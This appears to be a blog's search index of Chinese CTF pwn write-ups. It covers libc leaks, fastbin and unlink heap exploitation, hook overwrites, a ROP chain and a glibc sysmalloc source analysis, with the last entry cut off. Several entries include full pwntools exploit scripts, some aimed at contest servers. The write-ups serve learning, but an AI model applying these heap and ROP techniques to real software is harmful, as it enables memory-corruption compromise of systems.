<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[工具安装及使用]]></title>
    <url>%2F2018%2F08%2F30%2F%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[libc-database下载&amp;安装下载libc-database 1git clone https://github.com/niklasb/libc-database.git 下载各种版本的libc，存放在db目录下 12cd libc-database./get 使用1./find printf 260 puts f30 这里260是要查询的libc中printf地址的后三位（十六进制），同理f30是puts函数地址的后三位。]]></content>
  </entry>
  <entry>
    <title><![CDATA[2018网鼎杯第一场部分pwn]]></title>
    <url>%2F2018%2F08%2F30%2F2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BA%E9%83%A8%E5%88%86pwn%2F</url>
    <content type="text"><![CDATA[好久没做题，手已经生了，这次比赛提醒自己不能懈怠= = Guess基本逻辑程序逻辑比较简单，每次比对flag时fork一个新的子进程进行比较。 再给自己讲一次fork函数：系统会先给新的子进程分配资源，然后从父进程中将各个数据复制到新的进程中。虽然在gdb中调试查看父进程和子进程的同一个变量是在同一个地址，但是实际上的物理地址是不同的，它们的资源是独立的，操作父进程中的变量不会影响子进程，如题目中的v7。fork之后，对于子进程会返回0，对于父进程返回的是子进程的PID，因此在上述逻辑中，对于父进程，会执行v7++，并停等在wait处，直到子进程返回；对于子进程，break跳出循环后进行比对，比对结束后子进程退出。 漏洞分析程序中使用了gets函数，典型的缓冲区溢出函数。但是checksec，程序开启了canary保护： 在ctf-wiki中提到，当canary的值被修改后，程序就会执行__stack_chk_fail函数来打印argv[0]指针所指向的字符串，一般情况下都是程序名。 123456789101112131415161718// debug/stack_chk_fail.cvoid__attribute__ ((noreturn))__stack_chk_fail (void)&#123; __fortify_fail ("stack smashing detected");&#125;// debug/fortify_fail.cvoid__attribute__ ((noreturn)) internal_function__fortify_fail (const char *msg)&#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, "*** %s ***: %s terminated\n", msg, __libc_argv[0] ?: "&lt;unknown&gt;");&#125; 尝试输入超过0x40个字节，并在__fortify_fail处设置断点，查看__libc_message的参数： 此时argv[0]中的字符串为程序名，继续执行，就会打印结果： 因此，当我们能够覆盖argv[0]为存放flag的buf地址，就能通过canary机制将内容读出。而且每次canary被修改之后，只是子进程退出，而父进程仍在正常执行。 漏洞利用漏洞利用的思路为将argv[0]的地址覆盖为buf地址。由于buf为栈上的地址，因此首先需要泄露栈地址。在libc中有一个environ变量，它记录了程序的环境变量，而环境变量是存放在栈上的，可以通过读取这个值泄露栈上的地址。但在此之前，需要泄露libc的地址。 泄露libc地址将argv[0]覆写为puts@got的地址泄露puts函数地址。 查看执行gets前后的栈结构，发现有一个变量用于存放argv[0]： 计算S2和这个地址之间的偏移并填充，即可覆盖这一地址中的内容为puts@got的地址，canary保护就会输出puts函数的地址。 本题没有给出libc，可以使用libc-database来确定使用的是哪一版本的libc。 确定后通过相对偏移计算出environ变量的地址。 泄露栈地址在第二次覆写时，将0x7fffffffdf68处覆写为environ的地址，读出栈地址，通过偏移计算出buf地址。 读取flag第三次覆写时，将0x7fffffffdf68处覆写为buf地址，读出flag 利用脚本123456789101112131415161718192021222324252627282930313233from pwn import *context.log_level = 'debug'debug = 0if debug: p = process('./GUESS') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')else: p = remote('106.75.90.160',9999) libc = ELF('./libc-database/db/libc6_2.23-0ubuntu10_amd64.so')puts_got = 0x602020payload = 'a'*296 + p64(puts_got)p.sendlineafter("Please type your guessing flag\n",payload)p.recvuntil("*** stack smashing detected ***: ")puts_addr = u64(p.recv(6).ljust(8,'\0'))log.info("puts_addr:%#x",puts_addr)#gdb.attach(p,'b *0x400b23')environ_addr = puts_addr - (libc.symbols['puts']-libc.symbols['environ'])payload = 'a'*296 + p64(environ_addr)p.sendlineafter("Please type your guessing flag\n",payload)p.recvuntil("*** stack smashing detected ***: ")environ = u64(p.recv(6).ljust(8,'\0'))log.info("environ:%#x",environ)offset = 248rbp = environ - offsetbuf_addr = rbp-0x70payload = 'a'*296 + p64(buf_addr)p.sendlineafter("Please type your guessing flag\n",payload)p.interactive() blind顾名思义，blind的含义就是看不见输出，之前也遇到过同样类型的silent（强网杯），但是本题开了更多的保护机制。 基本逻辑程序主要有三个功能：add、change和release add用于添加一个0x68大小的块，向其中写入内容，同时更新ptr数组。ptr数组存放各个块的地址。 change修改块中的内容。 release释放指定的块，并更新free_time，此处限制了release函数使用的次数。 另外在add和change都用到了一个read_str函数，当遇到\n或输入长度达到限制时，会向当前位置写入一个0 漏洞分析在release函数中free后的指针没有置零，存在UAF漏洞。同时本程序还开启了RELRO保护，不能对GOT表进行修改。 可以通过UAF漏洞构造出fastbin attack一样的条件，即修改已释放的fastbin的FD指针指向一个伪造的块，当再次分配时，伪造的块就被分配出去。 本程序中bss段是可写的，且已经提供现成的system(‘/bin/sh’)，考虑将malloc_hook修改为system函数地址。而malloc_hook离main_arena很近，考虑在ptr数组中伪造一个指针指向main_arena。我们知道，当有一个0x100大小的块被释放时，会被放入unsortedbin，此时FD和BK都会被写成main_arena+88，如果能够伪造一个0x100的块并释放，就能够实现在ptr数组中写入main_arena+88。 漏洞利用为了能向malloc_hook中写入system，需要在ptr数组中伪造一个指向0x100大小块的指针，也就是要实现覆写功能。利用UAF能够修改已释放块的FD指针，让FD指向bss段上stderr-5前后的位置，这里能够保证size处正好对应0x7f，能够绕过free函数的检查。这一块分配出去后，能够向bss段写入0x68个字节，覆盖掉ptr中的内容，顺便覆盖掉free_time。 覆写的时候，从ptr[0]开始伪造fake_chunk，ptr[1]处写入块的大小0x101，ptr[4]位置写入ptr[2]，即ptr[4]控制的块指向ptr[2]处。 覆写完成后，考虑释放掉ptr[4]，但此处需要注意free函数有一些检查（我踩的坑）： __int_free会在释放之前会首先检查释放的chunk是否是16对齐的:misaligend_chunk(p)，不是的话会报错。如果是释放ptr[1]、ptr[3]……这类结尾是0x8的地址就会报错。 12345678static void_int_free (mstate av, mchunkptr p, int have_lock)&#123; ……if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0) || __builtin_expect (misaligned_chunk (p), 0)) ……&#125; 考虑到合并的问题，__int_free也会检查释放块是否使用中（即下一块的inuse位是否为1）、释放块的前一块是否使用中（即当前块的inuse是否为1）、释放块的下一块是否在使用中（下一块的下一块 inuse是否为1）。此题为了避免合并，将代表size的ptr[3]末尾置1，并伪造下一块的下一块inuse为1，同时为了确定不是double free，将下一块的inuse位末尾置一。为了实现置1的功能，在ptr 考虑到上述因素，需要在fake_chunk之后的0x100出写下inuse位1，代表fake_chunk正在使用,同时设置该块大小为0x20；在fake_chunk+0x100+0x20处写下inuse位1，代表fake_chunk的下一块正在使用，不会合并。因此在ptr[3]中写入ptr+0x100的地址，ptr[5]中写入ptr+0x120的地址。 一切准备就绪后，可以释放ptr[4]，ptr[2]处就会写入FD值，即main_arena+88。由于read_str函数在收到\n时会写入一个0，可以change第0块，只输入一个\n，那么ptr[2]中就由main_arena+88(0x7ffff7dd1b70)变成0x7ffff7dd1b00，这个地址正好就是malloc_hook-0x10，此时再change第四块，就能向malloc_hook写入system了。 填充的bss如下： 释放ptr[4]后的bss如下： 利用脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *context.log_level = 'debug'debug = 1if debug: p = process('./blind')else: p = remote('106.75.20.44',9999)bss_addr = 0x60203dptr_addr = 0x602060sys_addr = 0x4008e3fini_addr = 0x601db8def add(idx,content): p.sendlineafter("Choice:",'1') p.sendlineafter("Index:",str(idx)) p.sendlineafter("Content:",content)def change(idx,content): p.sendlineafter("Choice:",'2') p.sendlineafter("Index:",str(idx)) p.sendlineafter("Content:",content)def release(idx): p.sendlineafter("Choice:",'3') p.sendlineafter("Index:",str(idx))add(0,'0gur1')add(1,'1gur1')release(0)release(1)change(0,p64(bss_addr))add(2,'2gur1')#2-&gt;1add(3,'3gur1')#3-&gt;0fake_chunk = p64(0xdeadbeef)+p64(0x101)fake_chunk += p64(0)+p64(ptr_addr+0x100)payload = 'a'*(ptr_addr-bss_addr-16)+fake_chunk+p64(ptr_addr+0x10)+p64(ptr_addr+0x120)add(4,payload)#4-&gt;bss_addrchange(3,p64(0xdeadbeef)+p64(0x21))change(5,p64(0xdeadbeef)+p64(0x21))#gdb.attach(p,'b *0x400c94')release(4)change(4,'')#raw_input()change(2,'a'*0x10+p64(sys_addr))change(4,p64(0))p.sendlineafter("Choice:",'1')p.sendlineafter("Index:",'2')p.interactive() babyheapbabyheap和blind两道题很像，限制条件不同。 基本逻辑babyheap和blind的逻辑类似，不同的是babyheap添加了输出函数show，限制了change的次数，解除了release的次数限制，同时给content分配的块大小由0x68变成了0x20，ptr数组中的块数增加到了10块。 漏洞分析同样，babyheap中的release函数也没有对free掉的指针置零，存在UAF漏洞和double free漏洞。本题没有给system函数，先对libc进行泄露，再覆写free_hook为system。 libc的泄露和free_hook的改写都要需要对ptr数组进行修改，然后通过show和change函数完成泄露和改写。如何能对ptr数组改写呢？由于本题的块大小已被修改为0x20，即chunk size处为0x30，已不能使用blind中的方法。为了能对ptr进行覆写，可以伪造一个chunk，构造FD和BK，通过free触发unlink实现。 漏洞利用unlink实现ptr数组的覆写当要free一个0x90的块时，如果它的前一块是一个空闲块时，会先对前一块进行unlink，然后再把这两块合并。因此，我们需要一个chunk size为0x90且inuse位已经置零的chunk，以及空闲的上一块。 实际上，题目中是存在堆溢出漏洞的，可以利用这个漏洞修改某个块的chunk size字段。堆溢出漏洞如下：如果在已分配的content部分构造一个chunk size为0x30的fastbin，就能通过fastbin attack修改FD指针为这个chunk size，再次分配的块就指向了这个chunk+0x10处，在读入0x20个字节时，就会覆盖掉下一块的chunk size字段。 另外由于存在UAF漏洞，在fastbin attack中也能顺便泄露堆地址。 接下来，把content0构造成空闲的上一块，写入FD和BK指针。这里就是unlink的套路了，FD和BK分别写入ptr[0]-0x18和ptr[0]-0x10，在unlink时先检查 FD-&gt;bk==BK-&gt;fd==P，其中P为要释放的地址，即：*(ptr[0]-0x18+0x18) == *(ptr[0]-0x10+0x10) ==*(ptr[0])，接着是unlink的FD-&gt;bk=BK，BK-&gt;fd=FD，即： *(ptr[0]-0x18+0x18)=ptr[0]-0x10，*(ptr[0]-0x10+0x10)=ptr[0]-0x18，最终*(ptr[0])=ptr[0]-0x18，即ptr[0]中写入的是ptr[0]-0x18。 free时同blind一样，要注意inuse位的问题，上一块已经标注为空闲了；当前块的inuse位由下一块控制，地址为content2+0x90，可以事先申请好content3、content4、content5，这样content5就代表着content2的下一块，已经分配的content5 inuse位一定为1；下一块的inuse位由top控制，肯定为1。 至此，就能实现对ptr的覆写：change第0块相当于向ptr[0]-0x18写入内容，能够覆盖ptr[0]中的值为ptr[8]，再change第0块相当于向ptr[8]中写入内容，能够覆写ptr[8]，ptr[9]和edit_time。 泄露libc地址&amp;覆写free_hook在上一步的ptr[8]中写入free@got地址，show第8块即可泄露libc地址。 在上一步的ptr[9]中写入ptr[0]地址，泄露libc地址之后，向ptr[9]中写入free_hook的地址，即ptr[0]中为free_hook地址，再change第0块，写入one_gadget。 利用脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from pwn import *context.log_level = 'debug'debug = 1if debug: p = process('./babyheap') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')else: p = remote('106.75.20.44',9999) libc = ELF('./libc.so.6')ptr_addr = 0x602060free_got = 0x601f98gadget =[0x45216,0x4526a,0xf02a4,0xf1147]def add(idx,content): p.sendlineafter("Choice:",'1') p.sendlineafter("Index:",str(idx)) p.sendlineafter("Content:",content)def change(idx,content): p.sendlineafter("Choice:",'2') p.sendlineafter("Index:",str(idx)) p.sendlineafter("Content:",content)def show(idx): p.sendlineafter("Choice:",'3') p.sendlineafter("Index:",str(idx))def release(idx): p.sendlineafter("Choice:",'4') p.sendlineafter("Index:",str(idx))add(0,p64(0xdeadbeef)+p64(0x51)+p64(ptr_addr-0x18)+p64(ptr_addr-0x10)[:-1])add(1, p64(0xdeadbeef)+p64(0x31))add(2,'2gur1')add(3,'3gur1')add(4,'4gur1')add(5,'5gur1')release(3)release(2)release(3)#gdb.attach(p,'b *0x400d71\nc\nn\nx/8gx 0x602060')show(3)heap_addr = u64(p.recvuntil('\n')[:-1].ljust(8,'\0'))log.info('heap_addr:%#x',heap_addr)add(6,p64(heap_addr-0x20))#6-&gt;3add(7,'7gur1')#7-&gt;2add(8,'8gur1')#8-&gt;3payload = 'a'*16+p64(0x50)+p64(0x90)[:-1]add(9,payload)release(2)#gdb.attach(p)change(0,'a'*24+p64(ptr_addr+0x40)[:-1])change(0,p64(free_got)+p64(ptr_addr)+p64(0xffffffff))show(8)free_addr = u64(p.recvuntil('\n')[:-1].ljust(8,'\0'))free_hook = free_addr - libc.symbols['free']+libc.symbols['__free_hook']one_gadget = free_addr - libc.symbols['free']+ gadget[3]change(9,p64(free_hook))change(0,p64(one_gadget))release(4)p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WCTF2018-rswc]]></title>
    <url>%2F2018%2F07%2F11%2FWCTF2018-rswc%2F</url>
    <content type="text"><![CDATA[基本逻辑这一题也是典型的菜单类题目，共有5个功能： 123450. alloc1. edit2. show3. delete9. exit prepare函数模拟了堆初始化的过程。 其中mmap函数的原型如下： 1void* mmap(void* start,size_t length,int prot,int flags,int fd,off_t offset); 第三个参数prot表示保护方式： 12345#define PROT_READ 0x1 /* page can be read */#define PROT_WRITE 0x2 /* page can be written */#define PROT_EXEC 0x4 /* page can be executed */#define PROT_SEM 0x8 /* page may be used for atomic ops */#define PROT_NONE 0x0 /* page can not be accessed */ 第6行的mmap分配了一块0x1000大小的内存，且不可读、写以及执行，用于对堆的保护。 第11行分配了类似于arena的区域，存放指针，权限为rw。 接着初始化heap的函数init__() 先分配了0x3000内存作为heap，然后再arena中记录heap地址、top地址、heap大小以及已经分配的chunk数量。然后对arena进行了初始化。 alloc函数用于分配新的chunk，关键函数是malloc_memory() malloc_memory函数首先计算chunk实际的大小，完成对齐的功能。然后检查arena中记录的chunk中有没有处于空闲状态并且大于需求大小的，如果有，就分配该chunk；否则就在top中分配一块。 此处可以确定arena的结构： 返回到alloc函数后，对新分配的chunk进行初始化，并更新记录第一块的指针first edit函数用于编辑chunk中的content，输入idx，通过每个chunk的下一地址字段找到下一块。 show函数展示chunk的size、content dele函数修改下一块地址字段，并将arena中对应的chunk的inuse位置零。 漏洞分析arena分配的大小为0x1000，除去前面32字节的信息字段，一共可以存放254个chunk信息；而heap分配了0x3000，如果按照最小的块32字节大小来分配，一共可以分配0x3000/0x20=384个chunk。因而在分配第255个chunk时，arena就会溢出，但由于arena的下一块是rwx都不可操作的保护区域，这个溢出无法利用。 看出题人的题解，提到了Linux内核中的ulimit和mmap的关系。 123456789101112131415void arch_pick_mmap_layout(struct mm_struct *mm)&#123; unsigned long random_factor = 0UL; if (current-&gt;flags &amp; PF_RANDOMIZE) random_factor = arch_mmap_rnd(); if (mmap_is_legacy()) &#123; mm-&gt;mmap_base = TASK_UNMAPPED_BASE + random_factor; mm-&gt;get_unmapped_area = arch_get_unmapped_area; &#125; else &#123; mm-&gt;mmap_base = mmap_base(random_factor); mm-&gt;get_unmapped_area = arch_get_unmapped_area_topdown; &#125;&#125; 当mmap_is_legacy返回1时（旧版），mmap从低地址向高地址增长；当返回0时（新版），mmap从高地址向低地址增长。 1234567891011static int mmap_is_legacy(void)&#123; //若设置了ADDR_COMPAT_LAYOUT属性，则提供旧版的虚拟地址空间内存 if (current-&gt;personality &amp; ADDR_COMPAT_LAYOUT) return 1; //判断堆栈大小是否为无限制的 if (rlimit(RLIMIT_STACK) == RLIM_INFINITY) return 1; //sysctl_legacy_va_layout可以在/proc/sys/vm/legacy_va_layout中查看 return sysctl_legacy_va_layout;&#125; Linux中的ulimit -s命令能够限制进程使用的堆栈大小，当-s的参数为unlimited时，则是对大小不做限制。也就是说，如果在运行程序之前执行该命令，在执行mmap时，就会进入到第二个条件分支，mmap_is_legacy就会返回1。 先看正常情况下，mmap的分配情况。先分配的arena的地址是0x7ffff7ff5000，后分配的heap地址为0x7ffff7ff2000，即当前情况下，mmap是由高地址向低地址增长的，mmap_is_legacy返回的为0。 通过vmmap也能看出mmap的增长方向，最先分配的rwx都不可操作的保护区域，地址在最下面。 而此时的sysctl_legacy_va_layout的值为0，即使用新版的映射方式从高到低增长。 接下来执行ulimit -s unlimited，再次运行程序，查看内存。此时先分配的arena地址比后分配的heap地址更小了，即mmap变成了由低地址向高地址增长。 在vmmap中，两块区域的位置也发生了变化。 此时就可以利用arena的溢出来覆写heap区域来达成目标了。 还有一点是，本题开启了沙箱保护，只允许进行open、read、write、exit和exit_group操作，也就是不能直接获取shell，但是可以直接读写flag文件来获取flag。 漏洞利用分配254个以上的chunk造成arena的溢出。利用arena中chunk info的size字段覆盖heap中chunk的size字段，edit时会造成chunk的content溢出，覆写下一个chunk的”下一地址“（简称next）字段，进而利用show泄露和edit覆写got中函数地址。 将atoi函数覆写为gets函数，造成栈溢出，进而构造ROP劫持程序执行流。 利用脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485from pwn import *import timecontext.log_level='debug'p = process('./rswc')libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')def alloc(size): p.recvuntil('&gt; ') p.sendline('0') p.recvuntil('size: ') p.sendline(str(size))def edit(idx,content): p.recvuntil('&gt; ') p.sendline('1') p.recvuntil('index: ') p.sendline(str(idx)) p.recvuntil('content: ') p.sendline(content)def show(idx): p.recvuntil('&gt; ') p.sendline('2') p.recvuntil('index: ') p.sendline(str(idx))def dele(idx): p.recvuntil('&gt; ') p.sendline('3') p.recvuntil('index: ') p.sendline(str(idx))#normal block:0~253for i in range(0,254): alloc(16)#no.254 will cover the first chunkalloc(256)#overwrite no.253's ptratoi_got = 0x602068edit(254,'0gur1'.ljust(16,'x')+p64(atoi_got-16))#leak addressshow(254)p.recvuntil(' content: ')atoi_addr = u64(p.recv(6)+'\x00\x00')open_addr = atoi_addr - (libc.symbols['atoi']-libc.symbols['open'])read_addr = atoi_addr - (libc.symbols['atoi']-libc.symbols['read'])gets_addr = atoi_addr - (libc.symbols['atoi']-libc.symbols['gets'])write_addr = atoi_addr - (libc.symbols['atoi']-libc.symbols['write'])log.info('atoi_addr:%#x' %atoi_addr)#overwrite atoi_got with getsedit(254,p64(gets_addr))libc_base = atoi_addr-libc.symbols['atoi']pr_addr = libc_base + 0x0000000000021102prsi_addr = libc_base + 0x0202e8ppr_addr = libc_base + 0x00000000001150c9buf = 0x602000+0xa00#ROPshellcode= '0gur1'.ljust(0x18,'x')shellcode+=p64(pr_addr)+p64(0)shellcode+=p64(ppr_addr)+p64(0x30)+p64(buf)shellcode+=p64(read_addr)shellcode+=p64(pr_addr)+p64(buf)shellcode+=p64(ppr_addr)+p64(0)+p64(0)shellcode+=p64(open_addr)shellcode+=p64(pr_addr)+p64(3)shellcode+=p64(ppr_addr)+p64(0x30)+p64(buf)shellcode+=p64(read_addr)shellcode+=p64(pr_addr)+p64(1)shellcode+=p64(ppr_addr)+p64(0x30)+p64(buf)shellcode+=p64(write_addr)p.recvuntil('&gt; ')p.sendline('1')p.sendline(shellcode)time.sleep(1)p.send('flag.txt')p.interactive() 参考链接：WCTF 2018 - binja - rswc]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sysmalloc源码分析]]></title>
    <url>%2F2018%2F07%2F10%2Fsysmalloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[之前在做SUCTF的note时接触到了house of orange的原理，即将top的大小修改为一个比较小的值，再分配一个比size大的值时，原来的top就会free并放入到unsorted bin里，重新产生一个新的top。而note这道题由于可以自己创造出unsorted bin，就没有修改top的大小。今天简单看了一下sysmalloc的源码，重新认识了house of orange。ps：在网上找了一些大佬讲原理的blog，发现各位大佬都分析的是非主分配区部分的源码，而实际上多数用到的是main arena的源码，虽然原理类似，但是金牛座就愿意钻牛角尖=。= 一个用来调试的栗子123456789101112131415#define fake_size 0x1fe1int main(void)&#123; void *ptr; ptr=malloc(0x10); ptr=(void *)((int)ptr+24); *((long long*)ptr)=fake_size; malloc(0x2000); malloc(0x60);&#125; 栗子参考了ctf-wiki，将top的大小改为了0x1fe1，然后再分配0x2000大小的chunk，由于_int_malloc的其他环节都不能处理了，由此调用sysmalloc sysmalloc的源码根据上面的栗子，在第二个malloc处对sysmalloc的源码逐步分析的 123456789101112131415161718192021222324252627282930313233343536373839static void *sysmalloc (INTERNAL_SIZE_T nb, mstate av)&#123; mchunkptr old_top; /* incoming value of av-&gt;top */ INTERNAL_SIZE_T old_size; /* its size */ char *old_end; /* its end address */ long size; /* arg to first MORECORE or mmap call */ char *brk; /* return value from MORECORE */ long correction; /* arg to 2nd MORECORE call */ char *snd_brk; /* 2nd return val */ INTERNAL_SIZE_T front_misalign; /* unusable bytes at front of new space */ INTERNAL_SIZE_T end_misalign; /* partial page left at end of new space */ char *aligned_brk; /* aligned offset into brk */ mchunkptr p; /* the allocated/returned chunk */ mchunkptr remainder; /* remainder from allocation */ unsigned long remainder_size; /* its size */ size_t pagesize = GLRO (dl_pagesize); bool tried_mmap = false; /* If have mmap, and the request size meets the mmap threshold, and the system supports mmap, and there are few enough currently allocated mmapped regions, try to directly map this request rather than expanding top. */ if (av == NULL || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))) &#123; …… &#125; av是当前的分配区，mmap_threshold是能够使用mmap分配的阈值，n_mmaps_max是mmap分配的内存块设定的最大值，调试查看这两个值： 显然当前我们输入的0x2000不满足这个条件，执行下一个分支。 123456789101112131415161718old_top = av-&gt;top;old_size = chunksize (old_top);old_end = (char *) (chunk_at_offset (old_top, old_size));brk = snd_brk = (char *) (MORECORE_FAILURE);/* If not the first time through, we require old_size to be at least MINSIZE and to have prev_inuse set. */assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0));/* Precondition: not enough current space to satisfy nb request */assert ((unsigned long) (old_size) &lt; (unsigned long) (nb + MINSIZE)); 接下来获取原来的top信息：起始地址、大小、终止地址。并且要求满足两个assert的条件： 第一次调用sysmalloc函数，top还没有初始化；或者已经初始化，top的大小大于MINSIZE（0x10），表示前一个chunk处于inuse状态，以及top chunk的结束地址是页对齐的。 原top的大小小于当前要分配chunk的大小。 1234567891011121314151617181920212223242526272829303132333435363738if (av != &amp;main_arena) &#123; …… &#125;else /* av == main_arena */ &#123; /* Request enough space for nb + pad + overhead */ size = nb + mp_.top_pad + MINSIZE; /* If contiguous, we can subtract out existing space that we hope to combine with new space. We add it back later only if we don't actually get contiguous space. */ if (contiguous (av)) size -= old_size; /* Round to a multiple of page size. If MORECORE is not contiguous, this ensures that we only call it with whole-page arguments. And if MORECORE is contiguous and this is not first time through, this preserves page-alignment of previous calls. Otherwise, we correct to page-align below. */ size = ALIGN_UP (size, pagesize); /* Don't try to call MORECORE if argument is so big as to appear negative. Note that since mmap takes size_t arg, it may succeed below even if we cannot call MORECORE. */ if (size &gt; 0) &#123; brk = (char *) (MORECORE (size)); LIBC_PROBE (memory_sbrk_more, 2, brk, size); &#125; 之后是判断av是主分配区还是配主分配区，大部分大佬分析的都是非主分配区这部分，我这里就主要看主分配区了。先是重新计算需要分配的size。然后判断当前分配区是否连续，并将size按照页对齐。当size&gt;0时，通过MORECORE（sbrk）分配连续的内存。 contiguous函数定义为： 12#define NONCONTIGUOUS_BIT (2U)#define contiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0) 1234567891011if (brk != (char *) (MORECORE_FAILURE)) &#123; /* Call the `morecore' hook if necessary. */ void (*hook) (void) = atomic_forced_read (__after_morecore_hook); if (__builtin_expect (hook != NULL, 0)) (*hook)(); &#125; else &#123; …… &#125; 如果sbrk分配成功，并且MORECORE的hook函数存在，调用hook函数。（还不清楚hook用来干嘛） 12345678910111213141516171819if (brk != (char *) (MORECORE_FAILURE)) &#123; if (mp_.sbrk_base == 0) mp_.sbrk_base = brk; av-&gt;system_mem += size; /* If MORECORE extends previous space, we can likewise extend top size. */ if (brk == old_end &amp;&amp; snd_brk == (char *) (MORECORE_FAILURE)) set_head (old_top, (size + old_size) | PREV_INUSE); else if (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end) &#123; /* Oops! Someone else killed our space.. Can't touch anything. */ malloc_printerr (3, "break adjusted to free malloc space", brk, av); &#125; 如果sbrk_base还没有初始化，就根据brk修改sbrk_base的值。更新当前分配区的内存分配总量。 如果新的brk和旧的top结尾是同一地址，也就是说新分配的内存与原top是挨着的，就直接更新原top头中的大小和PREV_INUSE位，相当于直接扩大了top。 如果brk小于原top结尾，则出错。 而对于house of orange，由于我们修改了top大小，top_end也提前了，此时分配的brk和top_end不是同一地址，而是从未修改前的top结尾开始分配的内存，即以上两个条件都不满足，从而进入到下面的这个分支。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657 else &#123; front_misalign = 0; end_misalign = 0; correction = 0; aligned_brk = brk; /* handle contiguous cases */ …… /* Adjust top based on results of second sbrk */ if (snd_brk != (char *) (MORECORE_FAILURE)) &#123; av-&gt;top = (mchunkptr) aligned_brk; set_head (av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE); av-&gt;system_mem += correction; /* If not the first time through, we either have a gap due to foreign sbrk or a non-contiguous region. Insert a double fencepost at old_top to prevent consolidation with space we don't own. These fenceposts are artificial chunks that are marked as inuse and are in any case too small to use. We need two to make sizes and alignments work out. */ if (old_size != 0) &#123; /* Shrink old_top to insert fenceposts, keeping size a multiple of MALLOC_ALIGNMENT. We know there is at least enough space in old_top to do this. */ old_size = (old_size - 4 * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK; set_head (old_top, old_size | PREV_INUSE); /* Note that the following assignments completely overwrite old_top when old_size was previously MINSIZE. This is intentional. We need the fencepost, even if old_top otherwise gets lost. */ chunk_at_offset (old_top, old_size)-&gt;size = (2 * SIZE_SZ) | PREV_INUSE; chunk_at_offset (old_top, old_size + 2 * SIZE_SZ)-&gt;size = (2 * SIZE_SZ) | PREV_INUSE; /* If possible, release the rest. */ if (old_size &gt;= MINSIZE) &#123; _int_free (av, old_top, 1); &#125; &#125; &#125; &#125; &#125;&#125; /* if (av != &amp;main_arena) */ 先有一些对齐操作，这里省略掉了，其中aligned_brk就是处理好之后的内存地址。 重新设置av-&gt;top的地址，为重新分配的aligned_brk，然后通过set_head设置top的大小和标志位，更新分配区的总分配内存量。 接着将top chunk切分为fenceposts和空闲块两部分，设置切分出空闲chunk大小为old_size。最终通过int_free释放掉old_top。 执行前后heap的大小比对： 以及top地址的变化： 第二个malloc执行结束后，unsortedbin中存放的即为原来的top地址]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[suctf2018-noend]]></title>
    <url>%2F2018%2F07%2F09%2Fsuctf2018-noend%2F</url>
    <content type="text"><![CDATA[基本逻辑 函数逻辑比较简单，用户输入size，程序就分配size大小的chunk，接着用户向新分配的chunk内写入内容，程序在终端显示。当size小于等于0x7f时，就释放该chunk。 漏洞分析乍一看，“咦，平时我们不都这么写吗”。实际上，在malloc之后要对返回值进行检查。如果malloc出错了，后续的操作很有可能超出我们的控制。 下面这个函数就是当调用malloc时执行的函数，它会首先获取一个分配区（arena_get），然后调用_int_malloc分配内存。 1234567891011121314151617181920212223242526272829303132void *__libc_malloc (size_t bytes)&#123; mstate ar_ptr; void *victim; void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0)); //获取分配区 arena_get (ar_ptr, bytes); //分配内存 victim = _int_malloc (ar_ptr, bytes); /* Retry with another arena only if we were able to find a usable arena before. */ //分配失败时，换到其他分配区内分配 if (!victim &amp;&amp; ar_ptr != NULL) &#123; LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); &#125; if (ar_ptr != NULL) (void) mutex_unlock (&amp;ar_ptr-&gt;mutex); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim))); return victim;&#125; 由于noend程序中对输入的大小没有做限制，如果尝试输入一个很大的值，该值大于mmap分配的内存块设定的最大值（n_mmaps_max）,malloc在使用_int_malloc分配内存时，由于从fast bins，last remainder，small bins，large bins和top chunk都分配失败时，会调用sysmalloc函数，下面是对sysmalloc的简化。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677if (av == NULL || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))) &#123; //由于输入的值已经大于n_mmaps_max，不会进入此处执行 …… &#125;……if (av != &amp;main_arena) &#123; //考虑初始情况下都是在main_arena中进行分配，此处也不会执行 …… &#125; else /* av == main_arena */ &#123; /* Request enough space for nb + pad + overhead */ size = nb + mp_.top_pad + MINSIZE; if (contiguous (av)) size -= old_size; size = ALIGN_UP (size, pagesize); if (size &gt; 0) &#123; 